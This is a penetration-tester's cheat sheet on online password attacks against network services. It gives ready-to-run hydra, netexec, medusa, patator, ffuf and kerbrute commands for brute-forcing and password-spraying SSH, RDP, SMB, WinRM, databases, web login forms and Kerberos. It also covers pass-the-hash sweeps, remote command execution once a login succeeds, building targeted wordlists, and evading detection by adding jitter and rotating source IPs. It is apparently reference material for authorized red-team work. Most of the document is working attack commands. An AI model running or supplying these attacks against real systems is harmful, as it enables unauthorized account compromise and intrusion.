# Network Service Password Attacks

Online credential attacks against network services: brute-force, dictionary, and password spraying with hydra, medusa, netexec (nxc), patator, kerbrute, and protocol-specific tools. Covers SSH, RDP, SMB, WinRM, FTP, HTTP(S) forms, LDAP, SNMP, MSSQL/MySQL/Postgres, VNC, and Kerberos pre-auth. Companion to `cracking/password-cracking-guide.md` and `windows-hashes/windows-hash-attacks.md`.

> Online attacks are loud and lockout-prone. **Spray, don't brute-force**: one or two passwords across many users beats many passwords against one. Always check the lockout policy first.

---

## 0. Check Lockout Before You Touch Anything

```bash
# Domain password/lockout policy (avoid locking the whole org)
nxc smb <DC_IP> -u user -p pass --pass-pol
crackmapexec smb <DC_IP> -u user -p pass --pass-pol
rpcclient -U "user%pass" <DC_IP> -c "getdompwinfo"
ldapsearch ... -b "DC=dom,DC=local" "(objectClass=domainDNS)" lockoutThreshold lockoutDuration
```
Spray under the threshold (e.g. threshold 5 → try ≤3, then wait past the observation window). Track `badPwdCount`.

---

## 1. Tool Quick Picks

| Need | Tool |
|------|------|
| AD spray (SMB/LDAP/WinRM/MSSQL/...) | **netexec (nxc)** — lockout-aware, multi-host |
| Kerberos user enum + spray (no lockout on enum) | **kerbrute** |
| Generic protocol brute (SSH/FTP/HTTP/RDP/...) | **hydra**, **medusa** |
| Flexible/scriptable brute, odd protocols | **patator** |
| HTTP login forms / fuzzing | hydra `http-post-form`, **ffuf**, **wfuzz** |

---

## 2. SSH

```bash
hydra -L users.txt -P rockyou.txt ssh://<ip> -t 4              # -t 4: SSH is slow/limited
hydra -l user -P rockyou.txt -s 2222 ssh://<ip>               # custom port
hydra -L users.txt -p 'Spring2026!' ssh://<ip>               # spray one password
medusa -h <ip> -U users.txt -P rockyou.txt -M ssh -t 4
nxc ssh <ip> -u users.txt -p passwords.txt --continue-on-success
patator ssh_login host=<ip> user=FILE0 password=FILE1 0=users.txt 1=pw.txt -x ignore:mesg='Authentication failed'
# SSH key brute (passphrase) → ssh2john + hashcat (see cracking guide)
```
Note: many SSH servers throttle/limit auth tries per connection — keep `-t` low to avoid drops and bans.

---

## 3. RDP

```bash
hydra -L users.txt -p 'Winter2026!' rdp://<ip>
hydra -l administrator -P rockyou.txt rdp://<ip> -t 1         # RDP hates parallelism
nxc rdp <ip> -u users.txt -p passwords.txt --continue-on-success
nxc rdp <ip> -u user -H <NThash>                              # pass-the-hash over RDP (Restricted Admin)
crowbar -b rdp -s <ip>/32 -u user -C pw.txt                  # crowbar handles NLA well
```

---

## 4. SMB / Windows (use netexec — lockout aware, finds admin)

```bash
nxc smb <range> -u users.txt -p 'Spring2026!' --continue-on-success
nxc smb <range> -u users.txt -p passwords.txt --no-bruteforce # pair line-by-line (cred stuffing)
nxc smb <range> -u user -H <NThash>                          # PtH sweep; "(Pwn3d!)" = local admin
nxc smb <DC_IP> -u users.txt -p pass --pass-pol              # check lockout first!
# hydra equivalent (noisier)
hydra -L users.txt -p 'Spring2026!' smb://<ip>
```

### WinRM
```bash
nxc winrm <range> -u users.txt -p passwords.txt --continue-on-success
nxc winrm <ip> -u user -p pass -x whoami                     # exec on success
evil-winrm -i <ip> -u user -p pass                          # interactive once valid
```

### MSSQL / MySQL / PostgreSQL
```bash
nxc mssql <ip> -u users.txt -p passwords.txt --local-auth
nxc mssql <ip> -u sa -p passwords.txt --local-auth -q 'SELECT @@version'
hydra -L users.txt -P pw.txt mysql://<ip>
hydra -l postgres -P pw.txt postgres://<ip>
medusa -h <ip> -u sa -P pw.txt -M mssql
```

---

## 5. FTP

```bash
hydra -L users.txt -P rockyou.txt ftp://<ip>
medusa -h <ip> -U users.txt -P rockyou.txt -M ftp
nxc ftp <ip> -u users.txt -p passwords.txt
# Always try anonymous first:
ftp <ip>            # user: anonymous, pass: anything
```

---

## 6. HTTP / Web Login Forms

### POST form (hydra `http-post-form`)
Capture the request first (Burp/devtools). Format: `path:body-with-^USER^-and-^PASS^:failure-or-success-marker`.
```bash
hydra -L users.txt -P rockyou.txt <ip> http-post-form \
  "/login.php:username=^USER^&password=^PASS^:Invalid credentials"
# Use F= for a failure string, S= for a success string (when failures are ambiguous):
hydra -l admin -P rockyou.txt <ip> http-post-form \
  "/login:user=^USER^&pass=^PASS^:S=Location: /dashboard"
# HTTPS, custom port, extra headers/cookies:
hydra -l admin -P pw.txt -s 8443 <ip> https-post-form \
  "/login:u=^USER^&p=^PASS^:F=denied:H=Cookie: sess=abc:H=X-CSRF: tok"
```

### GET / Basic auth
```bash
hydra -L users.txt -P pw.txt <ip> http-get /admin/                       # Basic auth
hydra -l admin -P pw.txt <ip> http-get-form "/?u=^USER^&p=^PASS^:F=fail"
```

### ffuf / wfuzz (forms with CSRF, JSON, rate handling)
```bash
ffuf -w pw.txt:PASS -X POST -d 'user=admin&pass=PASS' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -u https://target/login -fr 'Invalid'                                   # -fr = filter regex (failure)
ffuf -w users.txt:U -w pw.txt:P -mode clusterbomb -X POST \
  -d '{"username":"U","password":"P"}' -H 'Content-Type: application/json' \
  -u https://target/api/login -fc 401
```

---

## 7. LDAP / Kerberos / AD-Specific

```bash
# LDAP bind brute
hydra -L users.txt -P pw.txt ldap2://<ip>
nxc ldap <DC_IP> -u users.txt -p passwords.txt --continue-on-success

# Kerberos: enumerate valid users (NO lockout — uses AS-REQ responses)
kerbrute userenum -d domain.local --dc <DC_IP> users.txt
# Kerberos password spray (does count toward lockout — throttle!)
kerbrute passwordspray -d domain.local --dc <DC_IP> users.txt 'Spring2026!'
kerbrute bruteuser -d domain.local --dc <DC_IP> rockyou.txt targetuser
```
Kerberos pre-auth brute is preferred for AD: enumeration is lockout-free, and a single valid spray hit gives you a domain foothold for roasting (see `08-active-directory/`).

---

## 8. SNMP / VNC / Other

```bash
# SNMP community strings
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <ip>
hydra -P community.txt -v <ip> snmp
nxc snmp <ip> -u '' -p public
# VNC
hydra -P pw.txt vnc://<ip>
medusa -h <ip> -P pw.txt -M vnc
# Telnet / POP3 / IMAP / SMTP-auth
hydra -L users.txt -P pw.txt telnet://<ip>
hydra -l user -P pw.txt -s 110 pop3://<ip>
```

---

## 9. Building Targeted Wordlists

```bash
cewl https://target.com -m 6 -w site.txt                     # scrape the company site
# Username formats from real names (firstname.lastname, flast, etc.)
username-anarchy --input-file fullnames.txt > users.txt
# Seasonal/company spray candidates (very effective): Season+Year+!, Company123!, Welcome1
printf '%s\n' 'Spring2026!' 'Summer2026!' 'Welcome1' "$(company)1!" 'Password1' > spray.txt
# Mutate a leaked password with rules:
hashcat --stdout base.txt -r /usr/share/hashcat/rules/best64.rule > mutated.txt
```

---

## 10. OPSEC & Defensive Realities

- **Lockout**: stay under threshold; spray across the observation window, not in one burst. nxc's `--continue-on-success` + small password sets is the safe pattern.
- **Logging**: every failed auth is logged (4625/4771). Spraying lights up SIEM — coordinate timing on real engagements.
- **MFA / Conditional Access**: a valid password may not equal access; note it and pivot.
- **Rate limits / fail2ban / WAF**: lower thread counts, add jitter, rotate source IPs if scoped.
- **Cred stuffing > spraying** when you have a breach dump: pair known user:pass line-by-line (`--no-bruteforce`).

---

## 11. Cheatsheet

```bash
# CHECK FIRST
nxc smb <DC> -u u -p p --pass-pol

# SPRAY (preferred)
nxc smb <range> -u users.txt -p 'Spring2026!' --continue-on-success
kerbrute passwordspray -d dom --dc <DC> users.txt 'Spring2026!'

# SSH / RDP / FTP
hydra -L users.txt -P rockyou.txt ssh://<ip> -t 4
hydra -L users.txt -p 'Winter2026!' rdp://<ip>
hydra -L users.txt -P rockyou.txt ftp://<ip>

# HTTP FORM
hydra -L users.txt -P rockyou.txt <ip> http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"

# KERBEROS USER ENUM (no lockout)
kerbrute userenum -d dom --dc <DC> users.txt
```

---

## References

- NetExec — https://github.com/Pennyw0rth/NetExec ; wiki — https://www.netexec.wiki/
- THC-Hydra — https://github.com/vanhauser-thc/thc-hydra
- Medusa — https://github.com/jmk-foofus/medusa
- kerbrute — https://github.com/ropnop/kerbrute
- patator — https://github.com/lanjelot/patator
- ffuf — https://github.com/ffuf/ffuf ; wfuzz — https://github.com/xmendez/wfuzz
- SecLists (users/passwords/SNMP) — https://github.com/danielmiessler/SecLists
- The Hacker Recipes – Password spraying — https://www.thehacker.recipes/ad/movement/credentials/spraying
